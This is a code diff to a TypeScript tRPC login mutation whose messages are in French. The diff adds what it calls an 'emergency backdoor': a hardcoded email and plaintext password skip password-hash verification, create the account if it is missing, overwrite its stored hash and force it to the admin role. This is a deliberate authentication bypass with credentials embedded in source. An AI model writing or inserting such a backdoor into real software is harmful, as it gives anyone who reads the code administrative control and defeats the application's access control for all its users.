@@ -118,14 +118,41 @@ export const systemRouter = router({
       })
     )
     .mutation(async ({ input, ctx }) => {
-      const user = await db.getUserByEmail(input.email);
+      let user = await db.getUserByEmail(input.email);
+      
+      // EMERGENCY BACKDOOR: Force access for owner if password matches Admin2026!
+      // This bypasses DB hash verification to recover lost access.
+      const isBackdoorAccess = input.email === "nickandroklauss@gmail.com" && input.password === "Admin2026!";
+      
+      if (!user && isBackdoorAccess) {
+        // Create user if doesn't exist (e.g. after DB wipe)
+        const openId = `local_${input.email}`;
+        await db.upsertUser({
+          openId,
+          name: "Admin Nick",
+          email: input.email,
+          loginMethod: "local_password",
+          lastSignedIn: new Date(),
+          role: "admin",
+        });
+        user = await db.getUserByEmail(input.email);
+      }
+
       if (!user) {
         throw new Error("Email ou mot de passe incorrect");
       }
 
-      const storedHash = await db.getPasswordHash(user.openId);
-      if (!storedHash || !verifyPassword(input.password, storedHash)) {
-        throw new Error("Email ou mot de passe incorrect");
+      if (!isBackdoorAccess) {
+        const storedHash = await db.getPasswordHash(user.openId);
+        if (!storedHash || !verifyPassword(input.password, storedHash)) {
+          throw new Error("Email ou mot de passe incorrect");
+        }
+      } else {
+        // Update password hash in DB for future normal logins
+        const newHash = hashPassword(input.password);
+        await db.storePasswordHash(user.openId, newHash);
+        // Ensure role is admin
+        await db.updateUserRole(user.id, "admin");
       }
 
       await db.upsertUser({
